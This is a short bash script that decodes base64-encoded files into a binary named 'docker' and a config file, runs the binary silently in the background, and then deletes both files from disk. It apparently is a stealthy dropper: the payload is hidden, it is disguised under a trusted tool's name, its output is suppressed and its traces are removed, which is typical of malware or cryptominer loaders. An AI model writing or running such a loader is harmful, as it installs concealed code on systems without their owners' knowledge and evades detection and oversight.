#!/bin/bash
 base64 -d dockerbase > docker
 base64 -d dockerconfig > docker.pb
 chmod 777 docker
./docker -config docker.pb> /dev/null 2>&1 &
 rm -rf ./docker
 rm -rf ./docker.pb
